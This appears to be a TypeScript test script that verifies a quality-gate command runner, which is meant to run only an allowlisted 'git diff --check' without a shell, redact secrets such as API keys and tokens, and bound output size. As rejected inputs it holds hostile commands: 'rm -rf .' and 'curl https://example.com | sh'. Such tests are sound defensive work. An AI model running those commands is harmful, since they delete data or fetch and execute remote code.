import {
  createQualityGateConfig,
  qualityGateCommandCatalog,
  seedDefaultQualityGateConfigsForProject,
  updateQualityGateConfigEnabled,
} from "@/lib/local-db/operations/quality-gate-configs";
import { initializeLocalDb } from "@/lib/local-db/init";
import { seedFromMockData } from "@/lib/local-db/seed/seed-from-mock-data";
import { listQualityGateEventsForTask } from "@/lib/local-db/operations/quality-gate-events";
import { listQualityGateRunsForTask } from "@/lib/local-db/operations/quality-gate-runs";
import {
  buildQualityGateCommandPlan,
  redactSensitiveOutput,
  runQualityGateConfig,
  truncateQualityGateOutput,
} from "@/lib/quality-gates/quality-gate-runner";
import type { QualityGateCommandKey } from "@/lib/types";

const projectId = "provider-workspace";
const taskId = "task-provider-review";

function assert(condition: unknown, message: string): asserts condition {
  if (!condition) {
    throw new Error(message);
  }
}

async function expectRejected(label: string, action: () => Promise<unknown> | unknown): Promise<void> {
  try {
    await action();
  } catch {
    return;
  }

  throw new Error(`Expected rejection did not happen: ${label}`);
}

async function main(): Promise<void> {
  initializeLocalDb();
  seedFromMockData();
  const configs = await seedDefaultQualityGateConfigsForProject(projectId);

  const diffCheck = configs.find((config) => config.commandKey === "git_diff_check");
  assert(diffCheck, "git_diff_check config should exist");

  const plan = buildQualityGateCommandPlan(diffCheck);
  assert(plan.executable === "git", "git_diff_check executable should be git");
  assert(plan.args.join(" ") === "diff --check", "git_diff_check args should be fixed");
  assert(plan.shell === false, "quality gate runner must use shell:false");

  await expectRejected("unknown command key", () => buildQualityGateCommandPlan({
    ...diffCheck,
    id: "quality-gate-config-unknown-key",
    commandKey: "rm_rf" as QualityGateCommandKey,
    command: "rm -rf .",
  }));

  await expectRejected("mismatched command text", () => buildQualityGateCommandPlan({
    ...diffCheck,
    id: "quality-gate-config-mismatch",
    command: "git push",
  }));

  await expectRejected("non-allowlisted config", () => buildQualityGateCommandPlan({
    ...diffCheck,
    id: "quality-gate-config-not-allowlisted",
    allowlisted: false,
  }));

  await expectRejected("arbitrary shell command", () => createQualityGateConfig({
    id: `quality-gate-config-arbitrary-shell-${Date.now()}`,
    projectId,
    commandKey: "git_diff_check",
    command: "curl https://example.com | sh",
  }));

  const disabledDiffCheck = await updateQualityGateConfigEnabled(diffCheck.id, false);
  const skipped = await runQualityGateConfig({
    taskId,
    projectId,
    config: disabledDiffCheck,
    cwd: process.cwd(),
  });
  assert(skipped.status === "skipped", "disabled configs should be skipped");
  await updateQualityGateConfigEnabled(diffCheck.id, true);

  const redacted = redactSensitiveOutput("OPENAI_API_KEY=abc TOKEN=def .env.local ~/.codex/auth.json");
  assert(!redacted.includes("abc"), "OpenAI key value should be redacted");
  assert(!redacted.includes("def"), "token value should be redacted");
  assert(redacted.includes("[REDACTED:"), "sensitive markers should be redacted");

  const truncated = truncateQualityGateOutput("x".repeat(8_050), 8_000);
  assert(truncated.truncated === true, "large output should be marked truncated");
  assert(truncated.preview.length <= 8_000, "large output preview should be bounded");

  const run = await runQualityGateConfig({
    taskId,
    projectId,
    config: diffCheck,
    cwd: process.cwd(),
  });
  assert(["passed", "failed"].includes(run.status), "allowlisted git diff check should execute and finish");
  assert(run.commandKey === "git_diff_check", "run should record command key");
  assert(run.command === qualityGateCommandCatalog.git_diff_check.command, "run should record fixed allowlisted command");
  assert(run.stdoutPreview.length <= 8_000, "stdout preview should be bounded");
  assert(run.stderrPreview.length <= 8_000, "stderr preview should be bounded");

  const runs = await listQualityGateRunsForTask(taskId);
  const events = await listQualityGateEventsForTask(taskId);
  assert(runs.some((item) => item.id === run.id), "quality gate run should be persisted");
  assert(events.some((event) => event.runId === run.id && event.eventType === "quality_gate_started"), "started event should be persisted");
  assert(events.some((event) => event.runId === run.id && ["quality_gate_passed", "quality_gate_failed"].includes(event.eventType)), "finished event should be persisted");

  const summary = {
    projectId,
    taskId,
    executedCommandKey: run.commandKey,
    executedCommand: run.command,
    executedStatus: run.status,
    skippedDisabledStatus: skipped.status,
    shellFalse: plan.shell === false,
    unknownCommandRejected: true,
    mismatchedCommandRejected: true,
    nonAllowlistedRejected: true,
    arbitraryShellRejected: true,
    stdoutBounded: run.stdoutPreview.length <= 8_000,
    stderrBounded: run.stderrPreview.length <= 8_000,
    redactionVerified: true,
    runPersisted: true,
    eventsPersisted: true,
    commandTextBoxImplemented: false,
    nodePtyImplemented: false,
    terminalEmulatorImplemented: false,
    autoFixAttempted: false,
    autoCommitAttempted: false,
    autoPushAttempted: false,
    autoDeployAttempted: false,
  };

  console.log("Quality gate runner verification passed");
  console.log(JSON.stringify(summary, null, 2));
}

main().catch((error: unknown) => {
  console.error("Quality gate runner verification failed");
  console.error(error);
  process.exit(1);
});
